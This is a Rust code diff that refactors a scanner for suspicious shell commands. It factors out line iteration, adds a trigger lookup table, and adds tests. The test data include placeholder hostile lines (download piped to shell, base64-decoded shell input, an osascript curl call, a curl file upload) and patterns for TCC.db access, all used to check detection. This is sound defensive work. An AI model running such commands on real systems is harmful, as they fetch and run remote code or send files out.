@@ -90,6 +90,16 @@ const NEEDLE_STARTS: [bool; 256] = {
     t
 };
 
+// `find_needles` matches raw bytes, which equals the decoded text only for ASCII needles.
+const _: () = {
+    let mut i = 0;
+    while i < MARKERS.len() {
+        assert!(MARKERS[i].needle.is_ascii());
+        i += 1;
+    }
+    assert!(TCC_NEEDLE.is_ascii());
+};
+
 /// Sets `hits` for every `MARKERS` needle and [`TCC_NEEDLE`] in `bytes`, in
 /// one pass. The needles are ASCII and lossy decoding never adds, drops or
 /// moves an ASCII byte, so this matches a search of the decoded text.
@@ -667,27 +677,63 @@ fn scan_line(line: &[u8], cut_start: bool, cut_end: bool, hits: &mut [bool; PATT
     }
 }
 
-/// Words one of which every [`scan_line`] hit needs.
+/// Words one of which every [`scan_line`] hit needs. Every intent pattern
+/// matched there must need one of these.
 const LINE_TRIGGERS: &[&[u8]] = &[b"curl", b"wget", b"base64", b"openssl", b"xxd"];
+
+/// Bytes that start some [`LINE_TRIGGERS`] word.
+const TRIGGER_STARTS: [bool; 256] = {
+    let mut t = [false; 256];
+    let mut i = 0;
+    while i < LINE_TRIGGERS.len() {
+        t[LINE_TRIGGERS[i][0] as usize] = true;
+        i += 1;
+    }
+    t
+};
 
 fn has_trigger(line: &[u8]) -> bool {
     (0..line.len()).any(|i| {
-        matches!(line[i], b'c' | b'w' | b'b' | b'o' | b'x')
-            && LINE_TRIGGERS.iter().any(|t| line[i..].starts_with(t))
+        TRIGGER_STARTS[line[i] as usize] && LINE_TRIGGERS.iter().any(|t| line[i..].starts_with(t))
     })
 }
 
-/// Runs [`scan_line`] over each `\n`/`\r`/NUL-delimited line of `bytes`; a
-/// backslash before `\n` or `\r\n` joins the next line (as one blank).
-/// `is_first`/`is_last` say whether the window's edges are real input edges.
+/// Runs [`scan_line`] over each line of `bytes` (see [`for_each_line`]).
 /// Only lines holding a [`LINE_TRIGGERS`] word are lossy-decoded and scanned;
 /// decoding splits cleanly at ASCII bytes, so this equals decoding the whole
 /// window first.
 fn scan_patterns(bytes: &[u8], is_first: bool, is_last: bool, hits: &mut [bool; PATTERNS.len()]) {
+    if hits.iter().all(|&h| h) {
+        return;
+    }
+    for_each_line(bytes, is_first, is_last, |line, cut_start, cut_end| {
+        if has_trigger(line) {
+            // Decoded, not raw: U+FFFD's width feeds the span limits.
+            scan_line(
+                String::from_utf8_lossy(line).as_bytes(),
+                cut_start,
+                cut_end,
+                hits,
+            );
+        }
+        !hits.iter().all(|&h| h)
+    });
+}
+
+/// Calls `f(line, cut_start, cut_end)` on each non-empty `\n`/`\r`/NUL-delimited
+/// line of `bytes` until it returns `false`; a backslash before `\n` or `\r\n`
+/// joins the next line (as one blank). `is_first`/`is_last` say whether the
+/// window's edges are real input edges; `cut_*` mark a line edge that isn't.
+fn for_each_line(
+    bytes: &[u8],
+    is_first: bool,
+    is_last: bool,
+    mut f: impl FnMut(&[u8], bool, bool) -> bool,
+) {
     let mut joined: Vec<u8> = Vec::new();
     let mut line_start = 0;
     let mut start = 0;
-    while start <= bytes.len() && !hits.iter().all(|&h| h) {
+    while start <= bytes.len() {
         let end = bytes[start..]
             .iter()
             .position(|&b| matches!(b, b'\n' | b'\r' | 0))
@@ -709,14 +755,14 @@ fn scan_patterns(bytes: &[u8], is_first: bool, is_last: bool, hits: &mut [bool; 
             joined.extend_from_slice(&bytes[start..end]);
             &joined[..]
         };
-        if !line.is_empty() && has_trigger(line) {
-            // Decoded, not raw: U+FFFD's width feeds the span limits.
-            scan_line(
-                String::from_utf8_lossy(line).as_bytes(),
+        if !line.is_empty()
+            && !f(
+                line,
                 line_start == 0 && !is_first,
                 end == bytes.len() && !is_last,
-                hits,
-            );
+            )
+        {
+            return;
         }
         joined.clear();
         start = end + 1;
@@ -897,9 +943,9 @@ mod tests {
         hits.patterns
     }
 
-    /// The window scan before #53: lossy-decode the whole window, then
-    /// search the text. The reference [`scan_window`] must match.
-    fn legacy_scan(window: &[u8], is_first: bool, is_last: bool) -> Hits {
+    /// Reference scan: lossy-decode the whole window, then search the text
+    /// (no trigger filter). [`scan_window`] must match it.
+    fn reference_scan(window: &[u8], is_first: bool, is_last: bool) -> Hits {
         let text = String::from_utf8_lossy(window);
         let mut hits = Hits::new();
         for (i, m) in MARKERS.iter().enumerate() {
@@ -915,51 +961,26 @@ mod tests {
             };
         }
         hits.patterns[TCC_DATABASE] = text.contains("TCC.db");
-        let bytes = text.as_bytes();
-        let mut joined: Vec<u8> = Vec::new();
-        let (mut line_start, mut start) = (0, 0);
-        while start <= bytes.len() && !hits.patterns.iter().all(|&h| h) {
-            let end = bytes[start..]
-                .iter()
-                .position(|&b| matches!(b, b'\n' | b'\r' | 0))
-                .map_or(bytes.len(), |p| start + p);
-            let newline_len = match (bytes.get(end), bytes.get(end + 1)) {
-                (Some(b'\n'), _) => 1,
-                (Some(b'\r'), Some(b'\n')) => 2,
-                _ => 0,
-            };
-            if newline_len > 0 && end > start && bytes[end - 1] == b'\\' {
-                joined.extend_from_slice(&bytes[start..end - 1]);
-                joined.push(b' ');
-                start = end + newline_len;
-                continue;
-            }
-            let line = if joined.is_empty() {
-                &bytes[start..end]
-            } else {
-                joined.extend_from_slice(&bytes[start..end]);
-                &joined[..]
-            };
-            if !line.is_empty() {
-                scan_line(
-                    line,
-                    line_start == 0 && !is_first,
-                    end == bytes.len() && !is_last,
-                    &mut hits.patterns,
-                );
-            }
-            joined.clear();
-            start = end + 1;
-            line_start = start;
+        let patterns = &mut hits.patterns;
+        if !patterns.iter().all(|&h| h) {
+            for_each_line(
+                text.as_bytes(),
+                is_first,
+                is_last,
+                |line, cut_start, cut_end| {
+                    scan_line(line, cut_start, cut_end, patterns);
+                    !patterns.iter().all(|&h| h)
+                },
+            );
         }
         hits
     }
 
-    fn assert_matches_legacy(window: &[u8]) {
+    fn assert_matches_reference(window: &[u8]) {
         for (is_first, is_last) in [(true, true), (true, false), (false, true), (false, false)] {
             let mut hits = Hits::new();
             scan_window(window, is_first, is_last, &mut hits);
-            let want = legacy_scan(window, is_first, is_last);
+            let want = reference_scan(window, is_first, is_last);
             assert_eq!(
                 (hits.markers, hits.patterns),
                 (want.markers, want.patterns),
@@ -1015,7 +1036,7 @@ mod tests {
             for _ in 0..1 + next(12) {
                 window.extend_from_slice(FRAGMENTS[next(FRAGMENTS.len())]);
             }
-            assert_matches_legacy(&window);
+            assert_matches_reference(&window);
         }
     }
 
@@ -1027,12 +1048,37 @@ mod tests {
         let mut window = b"curl x ".to_vec();
         window.extend(std::iter::repeat_n(0xff, 1400));
         window.extend_from_slice(b" | sh");
-        assert!(!legacy_scan(&window, true, true).patterns[DOWNLOAD_TO_SHELL]);
-        assert_matches_legacy(&window);
+        assert!(!reference_scan(&window, true, true).patterns[DOWNLOAD_TO_SHELL]);
+        assert_matches_reference(&window);
         window.truncate(7 + 1000);
         window.extend_from_slice(b" | sh");
-        assert!(legacy_scan(&window, true, true).patterns[DOWNLOAD_TO_SHELL]);
-        assert_matches_legacy(&window);
+        assert!(reference_scan(&window, true, true).patterns[DOWNLOAD_TO_SHELL]);
+        assert_matches_reference(&window);
+    }
+
+    /// Every line pattern needs a `LINE_TRIGGERS` word, so the trigger
+    /// filter can't hide one. A new pattern needs an example here.
+    #[test]
+    fn line_patterns_need_a_trigger() {
+        let examples: [(usize, &[u8]); 4] = [
+            (DOWNLOAD_TO_SHELL, b"curl x | sh"),
+            (DECODE_TO_SHELL, b"echo P | base64 -d | sh"),
+            (
+                OSASCRIPT_DOWNLOAD,
+                b"osascript -e 'do shell script \"curl x\"'",
+            ),
+            (LOCAL_UPLOAD, b"curl -d @f http://h"),
+        ];
+        for p in (0..PATTERNS.len()).filter(|&p| p != TCC_DATABASE) {
+            let (_, line) = examples
+                .iter()
+                .find(|(i, _)| *i == p)
+                .unwrap_or_else(|| panic!("no example for {}", PATTERNS[p].note));
+            let mut hits = [false; PATTERNS.len()];
+            scan_line(line, false, false, &mut hits);
+            assert!(hits[p], "{}", PATTERNS[p].note);
+            assert!(has_trigger(line), "{}", PATTERNS[p].note);
+        }
     }
 
     fn fires(text: &str, pattern: usize) -> bool {
